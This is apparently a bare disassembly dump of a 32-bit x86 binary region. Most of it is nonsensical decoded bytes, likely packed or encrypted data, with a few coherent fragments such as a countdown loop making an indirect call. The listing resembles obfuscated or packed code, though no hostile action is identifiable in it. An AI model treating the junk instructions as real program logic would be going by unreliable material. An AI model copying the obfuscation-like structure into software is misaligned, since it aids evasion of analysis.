  417bd6:	mov    ebp,0x61f27a1c
  417bdb:	dec    ecx
  417bdc:	fs ins BYTE PTR es:[edi],dx
  417bde:	sbb    cl,BYTE PTR [eax]
  417be0:	test   DWORD PTR [ecx+0x4d],eax
  417be3:	jns    0x417c00
  417be5:	ficomp WORD PTR ds:0x129a64c1
  417beb:	bound  edx,QWORD PTR [edx+ebx*4-0x70]
  417bef:	in     al,0x93
  417bf1:	in     al,0x57
  417bf3:	cmc    
  417bf4:	xchg   DWORD PTR cs:[eax+0x39302074],eax
  417bfb:	aaa    
  417bfc:	shr    ah,cl
  417bfe:	fnsave [edi-0x65]
  417c01:	mov    ecx,0x3ddfe76b
  417c06:	loope  0x417ba7
  417c08:	dec    ecx
  417c09:	jno    0x417b9c
  417c0b:	rcr    BYTE PTR [ecx-0x7706af28],cl
  417c11:	push   es
  417c12:	push   ecx
  417c13:	cmp    eax,0xa6c068de
  417c18:	mov    bh,0xfc
  417c1a:	stc    
  417c1b:	and    al,0x3f
  417c1d:	retf   0x7bb0
  417c20:	lock xchg dx,ax
  417c23:	fs pop ecx
  417c25:	outs   dx,DWORD PTR ds:[esi]
  417c26:	mov    ds:0x6f627d5b,eax
  417c2b:	xchg   ecx,eax
  417c2c:	cmp    al,0x4a
  417c2e:	fsqrt  
  417c30:	scas   eax,DWORD PTR es:[edi]
  417c31:	cmp    esp,DWORD PTR [ecx+ebx*1+0x40431269]
  417c38:	jl     0x417c75
  417c3a:	out    0x86,eax
  417c3c:	int    0xea
  417c3e:	leave  
  417c3f:	mov    esi,0x38ccf987
  417c44:	inc    BYTE PTR [esi+edx*8+0x3]
  417c48:	aam    0x26
  417c4a:	adc    al,0xed
  417c4c:	ds cld 
  417c4e:	ins    BYTE PTR es:[edi],dx
  417c4f:	sub    eax,0x21ed1944
  417c54:	xchg   esp,eax
  417c55:	xor    DWORD PTR [ecx+0x32],0xffffffaa
  417c59:	sbb    bl,BYTE PTR [eax]
  417c5b:	sub    esi,edi
  417c5d:	fwait
  417c5e:	cmp    BYTE PTR [eax],al
  417c60:	(bad)  
  417c61:	mov    eax,0xbf0835e
  417c66:	or     al,0x69
  417c68:	mov    ebp,0xa4112ed2
  417c6d:	sti    
  417c6e:	pop    edi
  417c6f:	dec    ebx
  417c70:	aad    0x28
  417c72:	mov    ds:0x3b828667,al
  417c77:	pop    es
  417c78:	mov    ebx,0x21d4c0a
  417c7d:	in     eax,dx
  417c7e:	or     bl,BYTE PTR [ebp-0x6ccd96b5]
  417c84:	fs inc ecx
  417c86:	mov    edi,0x1c1c8c84
  417c8b:	retf   
  417c8c:	or     eax,0xbfb885a3
  417c91:	or     ecx,esp
  417c93:	xchg   edi,eax
  417c94:	fdiv   DWORD PTR [eax-0x32]
  417c97:	inc    edi
  417c98:	lods   eax,DWORD PTR ds:[esi]
  417c99:	sbb    edi,ecx
  417c9b:	xor    ah,BYTE PTR [esi+ebx*4+0x471e0775]
  417ca2:	sbb    ch,0xc0
  417ca5:	xchg   ebx,eax
  417ca6:	je     0x417c7e
  417ca8:	mov    bh,0x55
  417caa:	scas   al,BYTE PTR es:[edi]
  417cab:	mov    BYTE PTR [edx-0x289e3c67],ch
  417cb1:	int3   
  417cb2:	stos   DWORD PTR es:[edi],eax
  417cb3:	(bad)  
  417cb4:	and    bl,BYTE PTR [eax+0x2e]
  417cb7:	cmp    BYTE PTR [ecx-0x75eada3a],dl
  417cbd:	(bad)  
  417cbf:	pop    esp
  417cc0:	mov    esp,0xeb3d97f
  417cc5:	sub    BYTE PTR ds:0x8059d3e3,0x7b
  417ccc:	jle    0x417ca1
  417cce:	cmp    ch,BYTE PTR [eax+0xd]
  417cd1:	xchg   ecx,eax
  417cd2:	add    edx,ecx
  417cd4:	sub    edi,DWORD PTR ds:0x42a3dd
  417cda:	mov    DWORD PTR [ebp-0x8],edx
  417cdd:	mov    DWORD PTR ds:0x42a359,0x16
  417ce7:	cmp    DWORD PTR ds:0x42a359,0x0
  417cee:	je     0x417d21
  417cf4:	cmp    DWORD PTR ds:0x42a359,0x24
  417cfb:	jne    0x417d0f
  417d01:	push   DWORD PTR [ebp-0x28]
  417d04:	push   0x42a3a1
  417d09:	call   DWORD PTR ds:0x4251e0
  417d0f:	mov    edi,DWORD PTR ds:0x42a359
  417d15:	dec    edi
  417d16:	mov    DWORD PTR ds:0x42a359,edi
  417d1c:	jmp    0x417ce7
  417d21:	mov    edx,DWORD PTR [ebp+0x8]
  417d24:	mov    DWORD PTR ds:0x42a361,0x4d18
  417d2e:	jmp    0x418240
  417d33:	into   
  417d34:	(bad)
  417d38:	(bad)  
  417d39:	(bad)  
  417d3b:	xchg   edi,ebp
  417d3d:	push   ebx
  417d3e:	call   0xa86cba80
  417d43:	aas    
  417d44:	fidivr DWORD PTR [edi+0x78]
  417d47:	jae    0x417dc5
  417d49:	js     0x417dc3
  417d4b:	sar    BYTE PTR [eax],1
  417d4d:	lods   eax,DWORD PTR ds:[esi]
  417d4e:	push   esp
  417d4f:	pop    es
  417d50:	jg     0x417cf8
  417d52:	jg     0x417d53
  417d54:	sbb    eax,0x861dbe7
  417d59:	into   
  417d5a:	cs mov ebx,0x2ce0a0ab
  417d60:	cmp    BYTE PTR [edi+0x7aa96df4],dh
  417d66:	loope  0x417d24
  417d68:	(bad)
  417d6b:	iret   
  417d6c:	call   0xdfe5:0x8b01deb7
  417d73:	or     al,0x2b
  417d75:	and    eax,0x330bdd86
  417d7a:	pop    edx
  417d7b:	mov    bh,0x1d
  417d7d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417d7e:	sbb    BYTE PTR [esi+0x102c1b9f],al
  417d84:	push   esp
  417d85:	lock mov BYTE PTR [ebx-0x356e77a6],cl
  417d8c:	es add al,0xdf
  417d8f:	std    
  417d90:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417d91:	pusha  
  417d92:	lds    esi,FWORD PTR [ebp-0x44]
  417d95:	cli    
  417d96:	dec    eax
  417d97:	pop    ebx
  417d98:	jmp    0xc48f:0xcc2e50ed
  417d9f:	repnz fild QWORD PTR [ebx+0x2bc324b7]
  417da6:	mov    edx,0x629d879b
  417dab:	push   ecx
  417dac:	out    0x60,al
  417dae:	fwait
  417daf:	mov    eax,0xf907a45a
  417db4:	xor    DWORD PTR [ebx-0x24],0xffffffd2
  417db8:	fwait
  417db9:	ds inc edx
  417dbb:	fisub  WORD PTR [ebx-0x56e40ed2]
  417dc1:	mov    bl,0xe2
  417dc3:	xchg   ebp,eax
  417dc4:	es mov ch,0x6b
  417dc7:	ja     0x417df5
  417dc9:	sub    BYTE PTR [eax-0x1a0806b4],ah
  417dcf:	je     0x417d8a
  417dd1:	xlat   BYTE PTR ds:[ebx]
  417dd2:	push   edx
  417dd3:	gs aas 
  417dd5:	retf   
  417dd6:	lods   eax,DWORD PTR ds:[esi]
  417dd7:	xchg   ebp,eax
  417dd8:	push   ebp
  417dd9:	arpl   WORD PTR [esi-0x77a16775],ax
  417ddf:	inc    edi
  417de0:	inc    ecx
  417de1:	and    al,0xd2
  417de3:	pop    edi
  417de4:	les    esp,FWORD PTR [ecx]
  417de6:	adc    dh,BYTE PTR [bx+0x74]
  417dea:	sti    
  417deb:	(bad)  
  417dec:	mov    al,0xec
  417dee:	out    dx,al
  417def:	mov    bl,0xac
  417df1:	mov    al,ds:0xe4566fc
  417df6:	pop    edx
  417df7:	fs mov esp,0xe4c889bf
  417dfd:	mov    edi,0x4c329d18
  417e02:	sub    ecx,edx
  417e04:	pop    eax
  417e05:	push   esp
  417e06:	adc    BYTE PTR [ecx-0x49bf1118],0xb0
  417e0d:	or     DWORD PTR [ebx-0x16],ebx
  417e10:	hlt    
  417e11:	pop    ds
  417e12:	mov    ?,esp
  417e14:	xchg   DWORD PTR [edx],esi
  417e16:	jae    0x417d9a
  417e18:	pop    ss
  417e19:	adc    al,0xba
  417e1b:	enter  0xd3ba,0x47
  417e1f:	lods   al,BYTE PTR ds:[esi]
  417e20:	scas   eax,DWORD PTR es:[edi]
  417e21:	(bad)  
  417e22:	jl     0x417df3
  417e24:	lods   al,BYTE PTR ds:[esi]
  417e25:	mov    eax,0x10de6760
  417e2a:	jo     0x417dc2
  417e2c:	adc    BYTE PTR [esi-0x7d],ah
  417e2f:	jge    0x417e3a
  417e31:	enter  0x8397,0xdb
  417e35:	jecxz  0x417e79
  417e37:	jo     0x417e98
  417e39:	lock imul edx,ebp,0x30
  417e3d:	pop    esp
  417e3e:	data16 fld QWORD PTR [eax-0x1e4e6d12]
  417e45:	stos   DWORD PTR es:[edi],eax
  417e46:	cmp    eax,0x9c706a0f
  417e4b:	sub    DWORD PTR [ecx],eax
  417e4d:	imul   esi
  417e4f:	int    0x93
  417e51:	fisttp WORD PTR ds:0xd44c74a9
  417e57:	add    dl,bh
  417e59:	rcr    BYTE PTR [esi+0x469ce0af],0x4c
  417e60:	scas   eax,DWORD PTR es:[edi]
  417e61:	sub    eax,DWORD PTR [esi]
  417e63:	shl    BYTE PTR [esi+ebp*8],0xa5
  417e67:	js     0x417e0c
  417e69:	rcr    DWORD PTR [eax],1
  417e6b:	pushf  
  417e6c:	jmp    0x417e9a
  417e6e:	les    eax,FWORD PTR [edx-0x77]
  417e71:	xchg   ebp,eax
  417e72:	pop    ecx
  417e73:	pop    ss
  417e74:	stos   DWORD PTR es:[edi],eax
  417e75:	loop   0x417e33
  417e77:	out    0xbf,al
  417e79:	test   al,0x13
  417e7b:	mov    esp,0xbd718524
  417e80:	cmp    DWORD PTR [esi+0x6fec8cef],ecx
  417e86:	sub    cl,BYTE PTR [ebx-0x2d]
  417e89:	pop    ds
  417e8a:	cdq    
  417e8b:	cdq    
  417e8c:	inc    edx
  417e8d:	push   0x16
  417e8f:	mov    bh,BYTE PTR [edi]
  417e91:	cs das 
  417e93:	cmp    al,BYTE PTR [eax-0x22]
  417e96:	repnz mov eax,0xec029bf4
  417e9c:	and    ah,BYTE PTR [ebx-0xc2940fb]
  417ea2:	pop    ebp
  417ea3:	pop    ebx
  417ea4:	add    eax,0xd48c3e19
  417ea9:	sysenter 
  417eab:	mov    dl,BYTE PTR [edx+ebp*1]
  417eae:	cmc    
  417eaf:	mov    BYTE PTR [edi],cl
  417eb1:	iret   
  417eb2:	fild   QWORD PTR [edi-0x73]
  417eb5:	sbb    ch,dh
  417eb7:	dec    ecx
  417eb8:	pop    ss
  417eb9:	mov    edi,0xf4d16ea2
  417ebe:	adc    eax,0xf82aa897
  417ec3:	leave  
  417ec4:	fnsave [edi]
  417ec6:	addr16 fst QWORD PTR [si-0x73]
  417ecb:	hlt    
  417ecc:	xlat   BYTE PTR ds:[ebx]
  417ecd:	lea    esp,[edi]
  417ecf:	and    esi,DWORD PTR [ebx]
  417ed1:	xor    ah,BYTE PTR [eax]
  417ed3:	pop    ecx
  417ed4:	jg     0x417e87
  417ed6:	test   al,0xcb
  417ed8:	repnz push esp
  417eda:	jmp    0xd4ff:0xc4de7c18
  417ee1:	lea    ebp,ds:0x3aa49705
  417ee7:	popf   
  417ee8:	mov    BYTE PTR [ebx-0x4a],al
  417eeb:	xchg   esp,eax
  417eec:	jnp    0x417f4b
  417eee:	xor    al,0x2d
  417ef0:	repz adc eax,0x9f510834
  417ef6:	dec    eax
  417ef7:	pop    edi
  417ef8:	mov    esi,0xcb7c592d
  417efd:	xchg   edx,eax
  417efe:	ins    BYTE PTR es:[edi],dx
  417eff:	stos   BYTE PTR es:[edi],al
  417f00:	lods   eax,DWORD PTR ds:[esi]
  417f01:	ret    0x70f2
  417f04:	jae    0x417eed
  417f06:	js     0x417f2b
  417f08:	mov    cl,0x16
  417f0a:	pop    esi
  417f0b:	aas    
  417f0c:	dec    eax
  417f0d:	cwde   
  417f0e:	stc    
  417f0f:	and    esi,ecx
  417f11:	mov    esp,0xba46798a
  417f16:	retf   
  417f17:	inc    ecx
  417f18:	fimul  WORD PTR [edx+ebp*4-0xd]
  417f1c:	dec    ebx
  417f1d:	xchg   ebp,eax
  417f1e:	cmp    dh,BYTE PTR [eax]
  417f20:	inc    ebx
  417f21:	ret    0xbf3f
  417f24:	add    eax,0x967d043e
  417f29:	xor    edi,esp
  417f2b:	inc    esp
  417f2c:	ret    0x2664
  417f2f:	push   edx
  417f30:	push   esi
  417f31:	call   0x71e99c6
  417f36:	mov    ds:0x9364a794,eax
  417f3b:	fist   DWORD PTR [eax]
  417f3d:	jnp    0x417f6a
  417f3f:	loop   0x417edb
  417f41:	inc    edx
  417f42:	mov    eax,ds:0x5a5f6aee
  417f47:	sub    DWORD PTR [ecx+esi*2],eax
  417f4a:	div    BYTE PTR [ebx]
  417f4c:	retf   
  417f4d:	add    eax,0x2cd2e39
  417f52:	or     ecx,DWORD PTR [ebp+0x7f7120ff]
  417f58:	ja     0x417f2c
  417f5a:	inc    edi
  417f5b:	push   0x57
  417f5d:	jmp    0xb1f2:0x2823043
  417f64:	daa    
  417f65:	imul   ebp,DWORD PTR [edx],0xf6cf12be
  417f6b:	sub    ebx,edx
  417f6d:	add    al,0xcb
  417f6f:	je     0x417fdb
  417f71:	sub    eax,0x72d4c15d
  417f76:	pop    edi
  417f77:	sbb    al,0x88
  417f79:	pop    ecx
  417f7a:	ret    0x6450
  417f7d:	or     ch,ah
  417f7f:	test   BYTE PTR ds:0x91dd8859,ah
  417f85:	add    DWORD PTR [edi+0x33],0xffffffe2
  417f89:	cmp    edi,DWORD PTR [ebx-0x3ad85db0]
  417f8f:	jmp    0xf74c7326
  417f94:	adc    eax,0x396f477a
  417f99:	mov    esi,0xb3415331
  417f9e:	shl    DWORD PTR [ecx+0x39],0x4b
  417fa2:	sbb    ebx,DWORD PTR [ebx+0x6be7fcbc]
  417fa8:	mov    ds:0xeeaf447f,al
  417fad:	pop    eax
  417fae:	mov    ebx,0x2dcf2c4d
  417fb3:	mov    eax,ds:0x6a1de327
  417fb8:	gs in  al,0x22
  417fbb:	xor    bl,bl
  417fbd:	fstp   TBYTE PTR [ecx+0x11]
  417fc0:	fs test al,0xe8
  417fc3:	mov    dh,0x2e
  417fc5:	mov    cl,0xdc
  417fc7:	inc    ebp
  417fc8:	ds (bad) 
  417fca:	(bad)  
  417fcb:	in     al,0xcf
  417fcd:	shr    BYTE PTR [esi+0x42],cl
  417fd0:	data16 ins BYTE PTR es:[edi],dx
  417fd2:	pop    esi
  417fd3:	ds inc edx
  417fd5:	xor    BYTE PTR [edi+0x5d],0x2
  417fd9:	(bad)  
  417fda:	aad    0x1e
  417fdc:	or     esi,DWORD PTR [edi-0x79]
  417fdf:	ins    DWORD PTR es:[edi],dx
  417fe0:	out    0xf1,eax
  417fe2:	push   edi
  417fe3:	inc    esp
  417fe4:	push   cs
  417fe5:	jne    0x417ffe
  417fe7:	mov    ds:0xf5fc5c6,al
  417fec:	sti    
  417fed:	ret    
  417fee:	call   0x50b7973e
  417ff3:	mov    ecx,0xc6565e18
  417ff8:	ja     0x417ff5
  417ffa:	push   ds
  417ffb:	fsubrp st(2),st
  417ffd:	xor    BYTE PTR [eax],bh
  417fff:	dec    BYTE PTR [edi-0x12e45c2d]
  418005:	mov    DWORD PTR [ebx+0x38],eax
  418008:	mov    ebx,edx
  41800a:	int    0x5f
  41800c:	xlat   BYTE PTR ds:[bx]
  41800e:	repnz loopne 0x41805b
  418011:	cmp    DWORD PTR ds:0xb32f8e22,edx
  418017:	add    al,0x4e
  418019:	xor    ebx,esp
  41801b:	xchg   esi,eax
  41801c:	dec    eax
  41801d:	push   esi
  41801e:	imul   eax,DWORD PTR [edi+eiz*1-0x712cd40b],0xf8ca018b
  418029:	push   ds
  41802a:	(bad)  
  41802b:	in     al,dx
  41802c:	sar    DWORD PTR [ebx+0x47aa407b],0x1f
  418033:	xchg   esi,eax
  418034:	jno    0x417fd9
  418036:	mov    ah,0xee
  418038:	call   0x15c76d05
  41803d:	ins    BYTE PTR es:[edi],dx
  41803e:	mov    ds:0x92725190,eax
  418043:	cdq    
  418044:	stos   BYTE PTR es:[edi],al
  418045:	repnz mov esi,0x1e98c61c
  41804b:	ja     0x4180b2
  41804d:	ja     0x418076
  41804f:	cmps   BYTE PTR es:[esi],BYTE PTR es:[edi]
  418051:	xor    ah,ah
  418053:	mov    ah,0x74
  418055:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418056:	mov    dh,0x87
  418058:	dec    ecx
  418059:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41805a:	push   eax
  41805b:	fisub  WORD PTR [ebp+0x13]
  41805e:	sbb    dh,al
  418060:	nop
  418061:	out    0xb0,eax
  418063:	popa   
  418064:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418065:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418066:	fadd   st(7),st
  418068:	or     eax,0x1da995f3
  41806d:	xlat   BYTE PTR ds:[ebx]
  41806e:	(bad)  
  41806f:	enter  0x570,0x86
  418073:	imul   ecx,esi,0x5d69a879
  418079:	inc    esi
  41807a:	int3   
  41807b:	test   BYTE PTR [edx+eiz*2+0x14],0x47
  418080:	(bad)  
  418081:	jg     0x4180a1
  418083:	jmp    0x1e7e52ad
  418088:	test   DWORD PTR [edi],0x182b997a
  41808e:	add    eax,0x1c2b167
  418093:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418094:	mov    ebp,0xb3ae22a0
  418099:	xlat   BYTE PTR ds:[ebx]
  41809a:	add    cl,BYTE PTR [edx-0x26b68e81]
  4180a0:	in     eax,dx
  4180a1:	cmp    al,0x63
  4180a3:	xor    al,0xa8
  4180a5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4180a6:	push   esi
  4180a7:	dec    ecx
  4180a8:	(bad)  
  4180a9:	cmp    edx,ebx
  4180ab:	mov    WORD PTR [ebp+0x4a],cs
  4180ae:	out    0x5b,eax
  4180b0:	pop    ecx
  4180b1:	out    dx,al
  4180b2:	push   0xa1b9163d
  4180b7:	outs   dx,BYTE PTR ds:[esi]
  4180b8:	in     eax,0x49
  4180ba:	jge    0x4180b3
  4180bc:	xchg   ebx,eax
  4180bd:	add    BYTE PTR [ebx],dl
  4180bf:	das    
  4180c0:	ins    DWORD PTR es:[edi],dx
  4180c1:	mov    dl,0x99
  4180c3:	jecxz  0x418118
  4180c5:	mov    bl,0xba
  4180c7:	push   eax
  4180c9:	out    dx,al
  4180ca:	mov    ds,WORD PTR [ebx-0x6a]
  4180cd:	sub    ch,bl
  4180cf:	jg     0x418061
  4180d1:	(bad)  
  4180d2:	lock push ecx
  4180d4:	les    ebx,FWORD PTR [edi+esi*1+0x2]
  4180d8:	lods   al,BYTE PTR ds:[esi]
  4180d9:	cmp    eax,0x28
  4180dc:	aam    0x71
  4180de:	sub    DWORD PTR es:[ebx+0x6d],edi
  4180e2:	je     0x41814a
  4180e4:	int    0xf3
  4180e6:	dec    esp
  4180e7:	and    esi,DWORD PTR [edi]
  4180e9:	dec    ecx
  4180ea:	sub    eax,0x8aaa06b8
  4180ef:	nop
  4180f0:	daa    
  4180f1:	lea    ebp,[edx+eax*4+0x61b9f7ca]
  4180f8:	or     BYTE PTR [edi+0x38],bl
  4180fb:	aad    0x1b
  4180fd:	fwait
  4180fe:	jno    0x418133
  418100:	test   eax,0x1279eb
  418105:	stos   BYTE PTR es:[edi],al
  418106:	clc    
  418107:	jecxz  0x4180d9
  418109:	xchg   ebp,eax
  41810a:	out    0xb7,al
  41810c:	and    eax,0xd753f042
  418111:	es nop
  418113:	leave  
  418114:	int    0x4d
  418116:	shr    BYTE PTR [ebp+0x7d],cl
  418119:	mov    DWORD PTR [edx],ecx
  41811b:	sub    dl,BYTE PTR [edx+0x70]
  41811e:	or     DWORD PTR [esi+0x56],eax
  418121:	mov    al,0x7f
  418123:	hlt    
  418124:	cli    
  418125:	or     DWORD PTR [ebx-0x68],0xd
  418129:	scas   eax,DWORD PTR es:[edi]
  41812a:	jg     0x418123
  41812c:	cmp    eax,0x2d9f1718
  418131:	je     0x4180cf
  418133:	or     BYTE PTR [edx-0x49b8add4],ah
  418139:	or     eax,0xfc1509f1
  41813e:	mov    DWORD PTR [ecx],0x2fc918a2
  418144:	cmp    eax,0x2f164492
  418149:	ficom  WORD PTR [eax-0x3a]
  41814c:	(bad)  
  41814d:	shl    DWORD PTR [ecx],1
  41814f:	adc    eax,0x508d9b46
  418154:	jecxz  0x4180dc
  418156:	les    edx,FWORD PTR [edi-0x38]
  418159:	jae    0x41812a
  41815b:	and    dl,BYTE PTR [eax+0x6f5ddbc4]
  418161:	or     ch,ch
  418163:	mov    dh,BYTE PTR [edi+0x7c59da9b]
  418169:	pop    ebp
  41816a:	lods   al,BYTE PTR ds:[esi]
  41816b:	xor    DWORD PTR [edx-0x32],0xffffff96
  41816f:	aaa    
  418170:	pop    edi
  418171:	sahf   
  418172:	jle    0x4181bf
  418174:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418175:	ins    DWORD PTR es:[edi],dx
  418176:	ss cmp dl,bh
  418179:	and    eax,0xe6e13389
  41817e:	add    al,0xd4
  418180:	add    dh,BYTE PTR [ebx-0x2b9e7d65]
  418186:	cmp    al,0xf8
  418188:	adc    al,0xcc
  41818a:	lock fcmovne st,st(4)
  41818d:	dec    esi
  41818e:	cli    
  41818f:	fisttp QWORD PTR [ecx+ebx*1+0x53f1f9bd]
  418196:	lock ja 0x418162
  418199:	and    eax,0xd44a1812
  41819e:	data16 xchg BYTE PTR [ebx],ah
  4181a1:	loope  0x4181f5
  4181a3:	cmp    eax,0xf6bad63f
  4181a8:	sbb    al,0x45
  4181aa:	fld    QWORD PTR [ebx+0x5840fcc7]
  4181b0:	xchg   edi,eax
  4181b1:	mov    ch,BYTE PTR [eax-0x624018cf]
  4181b7:	jb     0x418140
  4181b9:	mov    bl,0x89
  4181bb:	xor    ecx,eax
  4181bd:	cmc    
  4181be:	cmp    bl,bl
  4181c0:	addr16 push 0x4aefd056
  4181c6:	add    BYTE PTR [edi],dl
  4181c8:	sbb    esi,DWORD PTR gs:[edi+0x52]
  4181cc:	ror    BYTE PTR ds:0x4628cce3,cl
  4181d2:	adc    eax,DWORD PTR [esp+esi*8]
  4181d5:	xchg   esp,eax
  4181d6:	lea    edi,[edx+0x16a80d28]
  4181dc:	pop    ebx
  4181dd:	fild   DWORD PTR [esi+0x33279c7c]
  4181e3:	mov    dl,0x8
  4181e5:	(bad)  
  4181e6:	adc    ch,BYTE PTR [edx-0x2b]
  4181e9:	xor    BYTE PTR [ebp+0x26f6898e],dl
  4181ef:	push   edi
  4181f0:	jg     0x418268
  4181f2:	inc    edx
  4181f3:	push   esp
  4181f4:	jae    0x41824e
  4181f6:	fdivr  DWORD PTR [ebp-0x77]
  4181f9:	fld    TBYTE PTR [esp+ebx*1+0x3c]
  4181fd:	leave  
  4181fe:	outs   dx,DWORD PTR ds:[esi]
  4181ff:	and    eax,0xfdd792f0
  418204:	inc    edx
  418205:	addr16 fs jnp 0x418286
  418209:	jmp    0x41823c
  41820b:	jle    0x418198
  41820d:	cmp    WORD PTR [edi],bx
  418210:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418211:	xchg   al,ah
  418213:	inc    esi
  418214:	call   DWORD PTR [eax+0x140d78b8]
  41821a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41821b:	lds    esp,FWORD PTR [eax]
  41821d:	cs popf 
  41821f:	frstor [edx]
  418221:	retf   
  418222:	fimul  DWORD PTR [eax-0x227ab853]
  418228:	jmp    0x573d:0x481ef34a
  41822f:	jmp    0x41828f
  418231:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  418233:	dec    edx
  418234:	xchg   ebx,eax
  418235:	ror    BYTE PTR [edx+0x130cf7a4],1
  41823b:	cmp    al,0xb
  41823d:	xor    al,cl
  41823f:	dec    ecx
  418240:	xor    edx,eax
  418242:	xor    edi,edi
  418244:	xor    edi,DWORD PTR ds:0x42a351
  41824a:	and    DWORD PTR ds:0x42a3a9,edi
  418250:	jmp    0x418762
  418255:	int3   
  418256:	aas    
  418257:	into   
  418258:	rcl    ecx,0xd1
  41825b:	ror    ebp,cl
  41825d:	(bad)  
  41825e:	shl    DWORD PTR [eax+esi*8],1
  418261:	pop    ebp
  418262:	loop   0x4181ed
  418264:	inc    edi
  418265:	xor    bl,ch
  418267:	jg     0x4182e1
  418269:	jae    0x4182e7
  41826b:	js     0x4182e5
  41826d:	ja     0x41821a
  41826f:	imul   eax
  418271:	fmul   QWORD PTR [edi+0x3a]
  418274:	dec    ebp
  418275:	sbb    BYTE PTR [esi],dl
  418277:	sub    BYTE PTR [edi+ebp*8+0x60e84e02],cl
  41827e:	aad    0x19
  418280:	scas   al,BYTE PTR es:[edi]
  418281:	ins    DWORD PTR es:[edi],dx
  418282:	mov    DWORD PTR [esp+ecx*1+0xe],ecx
  418286:	loopne 0x418219
  418288:	add    DWORD PTR [edi+ebp*1],ebx
  41828b:	push   0x60a3027f
  418290:	std    
  418291:	lds    eax,FWORD PTR [ebp-0x6d]
  418294:	addr16 jp 0x418259
  418297:	add    cl,dh
  418299:	sbb    al,ah
  41829b:	or     esp,DWORD PTR [eax]
  41829d:	ret    
  41829e:	hlt    
  41829f:	inc    esi
  4182a0:	sbb    esp,ebp
  4182a2:	loop   0x4182e7
  4182a4:	push   edi
  4182a5:	icebp  
  4182a6:	mov    bl,0xfd
  4182a8:	jno    0x418324
  4182aa:	mov    ebx,0xb39540b0
  4182af:	add    BYTE PTR [ebx+0x30],0x44
  4182b3:	sbb    edx,esi
  4182b5:	out    0xfa,al
  4182b7:	aam    0x83
  4182b9:	pop    eax
  4182ba:	mov    ah,0x8c
  4182bc:	data16 das 
  4182be:	jb     0x4182d6
  4182c0:	adc    DWORD PTR [ebp-0x158b87db],ecx
  4182c6:	sub    eax,0x345379cf
  4182cb:	jmp    0x753a:0x73dd6052
  4182d2:	inc    edx
  4182d3:	rcl    DWORD PTR ds:0x6de69999,1
  4182d9:	mov    bh,0xd8
  4182db:	lea    eax,[ebx]
  4182dd:	push   ss
  4182de:	pop    esi
  4182df:	mov    WORD PTR [ecx],?
  4182e1:	ja     0x4182c4
  4182e3:	pop    esi
  4182e4:	stos   BYTE PTR es:[edi],al
  4182e5:	dec    ebx
  4182e6:	call   FWORD PTR [eax-0x2d]
  4182e9:	in     eax,0xf0
  4182eb:	jno    0x41832a
  4182ed:	jo     0x418324
  4182ef:	xlat   BYTE PTR ds:[ebx]
  4182f0:	loope  0x418329
  4182f2:	push   esp
  4182f3:	pop    eax
  4182f4:	and    BYTE PTR [ebp-0x7b],0xc
  4182f8:	cli    
  4182f9:	mov    cl,BYTE PTR [esp+edi*2]
  4182fc:	pop    edi
  4182fd:	in     eax,dx
  4182fe:	stc    
  4182ff:	lods   eax,DWORD PTR ds:[esi]
  418300:	cli    
  418301:	hlt    
  418302:	sti    
  418303:	call   0xbb40e052
  418308:	or     dh,dl
  41830a:	adc    eax,0x49725fc8
  41830f:	fbstp  TBYTE PTR [edx]
  418311:	and    esi,DWORD PTR [ebp+0x12]
  418314:	cmp    cl,BYTE PTR [edx-0x68c48963]
  41831a:	jmp    0x418341
  41831c:	iret   
  41831d:	push   esi
  41831e:	in     eax,dx
  41831f:	fs loop 0x41837c
  418322:	add    al,0x98
  418324:	jmp    0xcd60:0x1e047b02
  41832b:	or     ebp,ebp
  41832d:	xor    DWORD PTR [edi-0x3ac50969],0x72bff8c3
  418337:	cli    
  418338:	rcl    DWORD PTR [edi],1
  41833a:	retf   0x8bb8
  41833d:	loopne 0x41839c
  41833f:	adc    DWORD PTR [eax],ecx
  418341:	mov    dl,0x4
  418343:	xchg   esp,eax
  418344:	lods   eax,DWORD PTR ds:[esi]
  418345:	mov    ecx,0x40ce43c1
  41834a:	pop    esi
  41834b:	sub    bl,BYTE PTR [ebx]
  41834d:	fwait
  41834e:	push   eax
  41834f:	add    eax,0xee1b2d31
  418354:	sub    bh,BYTE PTR [edx]
  418356:	mov    cl,BYTE PTR [edx+0x63]
  418359:	lods   eax,DWORD PTR ds:[esi]
  41835a:	mov    eax,DWORD PTR [eax-0x6b5b6421]
  418360:	ds std 
  418362:	and    al,0xd1
  418364:	data16 jp 0x4183b6
  418367:	repnz fwait
  418369:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41836a:	ss aas 
  41836c:	push   0xc4b4fdaf
  418371:	clc    
  418372:	xor    eax,0xe3e1cd8c
  418377:	xor    edi,DWORD PTR [eax+0xa]
  41837a:	dec    edx
  41837b:	mov    bl,0xa4
  41837d:	or     eax,0x28bbc74f
  418382:	rcl    BYTE PTR [ebp+0x18154c03],1
  418388:	xor    al,0x81
  41838a:	or     BYTE PTR ds:0xe99f0250,cl
  418390:	sbb    BYTE PTR [edx+edx*8+0x4],ch
  418394:	in     al,dx
  418395:	jge    0x4183a4
  418397:	push   ebx
  418398:	xor    al,0xd2
  41839a:	adc    ebx,DWORD PTR [edx-0x3]
  41839d:	add    edi,DWORD PTR [ebx-0xeab7da2]
  4183a3:	int    0x19
  4183a5:	and    ah,BYTE PTR [ebp-0x4b795ab3]
  4183ab:	push   edx
  4183ac:	retf   0xcef0
  4183af:	ficomp WORD PTR [eax+0x21da833f]
  4183b5:	stos   DWORD PTR es:[edi],eax
  4183b6:	cmp    al,0x55
  4183b8:	mov    cl,0xb4
  4183ba:	adc    al,BYTE PTR [ebp+0x1b]
  4183bd:	xchg   edx,eax
  4183be:	mov    edx,0x57927bf4
  4183c3:	inc    edx
  4183c4:	add    edi,DWORD PTR [esi]
  4183c6:	inc    esi
  4183c7:	and    ebp,DWORD PTR [edi]
  4183c9:	mov    ah,0xb7
  4183cb:	loopne 0x4183e2
  4183cd:	inc    esp
